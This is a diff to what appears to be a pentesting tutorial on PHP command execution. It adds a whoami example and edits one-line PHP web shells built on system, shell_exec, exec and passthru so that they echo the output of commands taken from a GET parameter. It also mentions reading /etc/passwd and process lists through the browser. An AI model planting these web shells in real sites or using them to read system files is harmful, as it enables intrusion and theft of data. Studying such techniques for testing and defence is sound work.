@@ -15,28 +15,36 @@ Basically:
 
 In order for these functions to work, they must be enabled in the `php.ini` configuration file.
 
+The most common of the executions via PHP that we can configure is the following:
+
+```php
+<?php
+    system('whoami');
+?>
+```
+
 system\(\):
 
 ```php
-<?php system($_GET['cmd']);?>
+<?php echo system($_GET['cmd']);?>
 ```
 
 shell\_exec\(\):
 
 ```php
-<?php shell_exec($_GET['cmd']);?>
+<?php echo shell_exec($_GET['cmd']);?>
 ```
 
 exec\(\):
 
 ```php
-<?php exec($_GET['cmd']);?>
+<?php echo exec($_GET['cmd']);?>
 ```
 
 passthru\(\): 
 
 ```php
-<?php passthru($_GET['cmd']);?>
+<?php echo passthru($_GET['cmd']);?>
 ```
 
 When executing certain commands such as `ps -faux`, or a simple `cat / etc / passwd`, you can see how the output shown via the web has an unpleasant aspect to read. We can fix this by adding some preformatting tags to our script:
